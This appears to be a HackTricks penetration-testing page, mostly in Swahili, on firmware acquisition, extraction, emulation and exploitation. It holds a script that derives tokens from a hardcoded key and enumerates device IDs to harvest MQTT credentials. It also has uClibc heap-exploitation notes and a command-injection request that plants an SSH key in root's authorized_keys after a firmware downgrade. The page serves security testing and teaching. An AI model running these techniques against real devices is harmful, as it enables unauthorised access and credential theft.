# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi kwa usahihi kwa kusimamia na kuwezesha mawasiliano kati ya sehemu za hardware na programu ambazo watumiaji wanazitumia. Imehifadhiwa kwenye kumbukumbu ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu inapoamilishwa, na kusababisha uzinduzi wa mfumo wa uendeshaji. Kuchunguza na labda kubadilisha firmware ni hatua muhimu katika kubaini udhaifu wa usalama.

## **Ukusanyaji wa Taarifa**

**Ukusanyaji wa Taarifa** ni hatua ya mwanzo muhimu katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unajumuisha kukusanya taarifa kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaoendeshwa
- Maelezo ya bootloader
- Mpangilio wa hardware na datasheets
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Historia za updates na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za open-source intelligence (OSINT) ni muhimu, kama vile uchambuzi wa vipengele vyovyote vya open-source kupitia mchakato wa mapitio ya mkono na ya kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) zinatoa static analysis bila malipo ambazo zinaweza kutumika kubaini masuala yanayoweza kuwepo.

## **Kupata Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na ugumu wake:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kujenga** kutoka kwa maelekezo yaliyotolewa
- **Kupakua** kutoka tovuti rasmi za msaada
- Kutumia maswali ya **Google dork** kutafuta faili za firmware zilizo mwenyeji
- Kupata **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukamata **updates** kupitia mbinu za man-in-the-middle
- **Kutoa** kutoka kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
- **Sniffing** kwa ajili ya maombi ya updates ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Dumping** kutoka bootloader au mtandao
- **Kutoa na kusoma** chip ya storage, wakati yote mengine yamefeli, kwa kutumia zana za kifaa zinazofaa

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Kuchambua firmware

Sasa baada ya kuwa na firmware, unahitaji kutoa taarifa kuhusu ili kujua jinsi ya kuishughulikia. Zana mbalimbali unazoweza kutumia kwa ajili ya hilo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa hukupata mengi kwa zana hizo, angalia **entropy** ya image kwa kutumia `binwalk -E <bin>`; ikiwa entropy ni ndogo, basi siyo uwezekano kuwa imeencrypted. Ikiwa entropy ni juu, inawezekana imeencrypted (au imecompressed kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **faili zilizowekwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kwa kuchunguza faili.

### Kupata mfumo wa faili

Kwa zana zilizotajwa hapo awali kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kawaida huichoma ndani ya **folda iliyopewa jina la aina ya filesystem**, ambayo kwa kawaida ni moja ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa mfumo wa faili kwa mkono

Wakati mwingine, binwalk haitakuwa na **magic byte ya filesystem katika signatures zake**. Katika kesi hizi, tumia binwalk kutafuta **offset ya filesystem na kuchonga (carve) filesystem iliyokandamizwa** kutoka kwenye binary na kisha **kutoa kwa mikono** filesystem kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo ili kuchonga Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Mbadala yake, amri ifuatayo pia inaweza kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (imetumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa katika saraka ya `squashfs-root` baadaye.

- Kwa arhivu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystem za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystem za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Mara firmware itakapopatikana, ni muhimu kuiweka chini ya uchambuzi ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri zimetolewa kwa ajili ya ukaguzi wa awali wa faili binari (inayorejelewa kama `<bin>`). Amri hizi zinausaidia kubaini aina za faili, kutoa strings, kuchambua data za binari, na kuelewa partition na maelezo ya filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya usimbaji ya image, **entropy** inakaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini inaonyesha kukosekana kwa usimbaji, wakati entropy ya juu inaashiria uwezekano wa usimbaji au compression.

Kwa kuchomoa **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili zinapendekezwa.

### Kuchomoa Filesystem

Kutumia `binwalk -ev <bin>`, kwa kawaida unaweza kuchomoa filesystem, mara nyingi ndani ya direktori inayojulikana kwa jina la aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kutokana na kukosa magic bytes, uondoaji wa mkono unahitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya filesystem, ikifuatiwa na amri ya `dd` kukata (carve out) filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), amri tofauti zinaweza kutumika kutoa yaliyomo kwa mkono.

### Uchambuzi wa filesystem

Baada ya filesystem kutolewa, utaftaji wa mapungufu ya usalama unaanza. Uangalifu unaelekezwa kwa daemons za mtandao zisizo salama, hardcoded credentials, API endpoints, update server functionalities, code isiyokuwa compiled, startup scripts, na compiled binaries kwa uchambuzi wa offline.

**Maeneo muhimu** na **vipengele** vya kukagua vinajumuisha:

- **etc/shadow** na **etc/passwd** kwa user credentials
- Vyeti na funguo za SSL katika **etc/ssl**
- Faili za configuration na script kwa udhaifu unaowezekana
- Embedded binaries kwa uchambuzi zaidi
- Web servers za kawaida za vifaa vya IoT na binaries

Zana kadhaa zinaweza kusaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Ukaguzi wa Usalama kwenye Compiled Binaries

Msimbo wa chanzo na compiled binaries zinazopatikana katika filesystem zinapaswa kuchunguzwa kwa udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo na ulinzi ambazo zinaweza kutumika.

## Kuvuna cloud config na MQTT credentials kupitia token za URL zilizotokana

Hubs nyingi za IoT zinachukua usanidi wa kifaa kwa kila kifaa kutoka kwenye cloud endpoint ambayo inaonekana kama:

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware unaweza kugundua kwamba `<token>` hutokana mahali kutoka kwa device ID kwa kutumia siri iliyowekwa (hardcoded), kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu unamuwezesha mtu yeyote anayeweza kupata deviceId na STATIC_KEY kujenga upya URL na kuvuta cloud config, mara nyingi akifichua plaintext MQTT credentials na topic prefixes.

Mchakato wa vitendo:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha muundo wa cloud config URL na anwani ya broker, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata STATIC_KEY na algoriti ya token kutoka firmware

- Pakia binaries ndani ya Ghidra/radare2 na tafuta njia ya config ("/pf/") au matumizi ya MD5.
- Thibitisha algoriti (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Zalisha token katika Bash na fanya digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pata cloud config na MQTT credentials

- Tengeneza URL na vuta JSON kwa kutumia curl; chambua kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na ACLs za topic dhaifu (ikiwa ipo)

- Tumia credentials zilizopatikana kujisajili kwenye maintenance topics na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha vitambulisho vya vifaa vinavyoweza kutabirika (kwa wigo mkubwa, kwa idhini)

- Mifumo mingi hujumuisha vendor OUI/product/type bytes ikifuatiwa na kiambishi cha mfululizo.
- Unaweza kurudia vitambulisho vinavyowezekana, kutoa tokens na kupata configs kwa njia ya programu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Vidokezo
- Daima pata idhini wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kurecover secrets bila kubadilisha target hardware inapowezekana.

Mchakato wa emulating firmware unawezesha **dynamic analysis** ya uendeshaji wa kifaa au programu binafsi. Mbinu hii inaweza kukutana na changamoto zinazohusiana na hardware au architecture dependencies, lakini kuhamisha root filesystem au binaries maalum kwenye kifaa chenye architecture na endianness inayofanana, kama Raspberry Pi, au kwenye virtual machine iliyotengenezwa mapema, kunaweza kurahisisha majaribio zaidi.

### Emulating Binafsi Binaries

Kwa kuchunguza programu moja, kutambua endianness na CPU architecture ya programu ni muhimu.

#### Mfano wa MIPS Architecture

Ili emulate binary ya MIPS architecture, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za uigaji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` inatumika, na kwa little-endian binaries, `qemu-mipsel` ndio chaguo.

#### Mimika ya Arkitekture ya ARM

Kwa binaries za ARM, mchakato ni sawa, na emulator `qemu-arm` hutumika kwa mimika.

### Mimika ya Mfumo Kamili

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyingine, zinawezesha mimika kamili ya firmware, kuendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au yaliyomimika hutumiwa kwa uchambuzi. Ni muhimu kudumisha shell access kwa OS na filesystem. Mimika inaweza isifanane kikamilifu na mwingiliano wa hardware, hivyo mara kwa mara inahitajika kuanzishwa tena. Uchambuzi unapaswa kurudia kupitia filesystem, kutumia kurasa za wavuti zilizo wazi na huduma za mtandao, na kuchunguza udhaifu wa bootloader. Mitihani ya uadilifu ya firmware ni muhimu kubaini uwezekano wa udhaifu wa backdoor.

## Mbinu za Runtime Analysis

Runtime analysis inahusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini udhaifu kupitia fuzzing na mbinu nyingine.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

Kuunda PoC kwa ajili ya udhaifu ulioainishwa kunahitaji uelewa wa kina wa muundo wa lengo na uandishi wa programu kwa lugha za ngazi ya chini. Binary runtime protections katika mifumo iliyojazwa ni nadra, lakini inapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuwa za lazima.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc inatumia fastbins kama glibc. Ugawaji mkubwa uliofanywa baadaye unaweza kuwasha `__malloc_consolidate()`, kwa hivyo chunk bandia yoyote lazima ipite kwenye ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks za karibu zikionekana kama "in use").
- **Non-PIE binaries under ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu ni **non-PIE**, anwani za ndani za `.data/.bss` ni thabiti. Unaweza kulenga eneo linalofanana tayari na header halali ya heap chunk ili kupangisha ugawaji wa fastbin kwenye **function pointer table**.
- **Parser-stopping NUL:** wakati JSON inapofanyiwa parse, `\x00` katika payload inaweza kusimamisha parsing huku ikihakikisha byte za mwisho zinazoathiriwa na mshambuliaji zinabaki kwa ajili ya stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayoitisha `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupandisha shellcode inayotekelezwa kwenye mapping inayojulikana na kuruka hadi hapo.

## Prepared Operating Systems for Firmware Analysis

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyopangwa awali kwa firmware security testing, yakiwa na zana muhimu zilizowekwa.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro inayolenga kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda kwa kutoa mazingira yaliyowekwa tayari na zana zote muhimu zimepakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata pale muuzaji anapotekeleza ukaguzi wa saini za cryptographic kwa firmware images, ulinzi wa version rollback (downgrade) mara nyingi haujatumika. Wakati boot- au recovery-loader inathibitisha saini tu kwa public key iliyojazwa lakini haisi kulinganisha version (au monotonic counter) ya image inayoflashwa, mshambuliaji anaweza kusakinisha kwa njia halali firmware ya zamani yenye udhaifu ambayo bado ina saini halali na hivyo kuirudisha tena udhaifu uliorekebishwa.

Kazi ya kawaida ya shambulio:

1. **Obtain an older signed image**
* Kichukue kutoka kwenye portal ya kupakua ya muuzaji, CDN au tovuti ya msaada.
* Itoa kutoka kwenye apps za mobile/desktop za nyongeza (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Ipatilie kwenye repositori za pihakati kama VirusTotal, Internet archives, forums, n.k.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Vifaa vingi vya consumer IoT vinaonyesha endpoints za HTTP(S) zisizohitaji uthibitisho ambazo zinakubali blobs za firmware zilizohenjwa kwa Base64, kuzi-decode upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, tumia udhaifu uliorekebishwa katika toleo jipya (kwa mfano filter ya command-injection iliyoongezwa baadaye).
4. Kwa hiari, flash tena image ya hivi karibuni au uzime updates ili kuepuka kugunduliwa mara persistence itakapopatikana.

### Mfano: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo dhaifu (downgraded), parameter ya `md5` inaunganishwa moja kwa moja ndani ya amri ya shell bila kusafishwa, ikiruhusu injeksheni ya amri za hiari (hapa – kuwezesha SSH key-based root access). Toleo za baadaye za firmware ziliingiza chujio rahisi la herufi, lakini ukosefu wa ulinzi wa downgrade unafanya suluhisho hilo kuwa batili.

### Kutoa Firmware Kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao za rununu ili app iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Pakiti hizi kawaida huhifadhiwa bila kusimbwa ndani ya APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Vifaa kama `apktool`, `ghidra`, au hata `unzip` rahisi vinakuwezesha kutoa picha zilizosainiwa bila kugusa hardware ya kimwili.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kukagua Mantiki ya Uboreshaji

* Je, usafirishaji/uthibitishaji wa *update endpoint* umehifadhiwa vya kutosha (TLS + authentication)?
* Je, kifaa kinalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image inathibitishwa ndani ya secure boot chain (mfano: signatures zinakaguliwa na ROM code)?
* Je, userland code inafanya sanity checks za ziada (mfano: allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia validation logic ile ile?

> 💡 Ikiwa yoyote ya hapo juu inakosekana, jukwaa huenda likawa hatarini kwa rollback attacks.

## Firmware zilizo dhaifu kwa mazoezi

Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ifuatayo ya firmware zilizo dhaifu kama hatua ya kuanzia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Mafunzo na Cheti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Marejeo

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
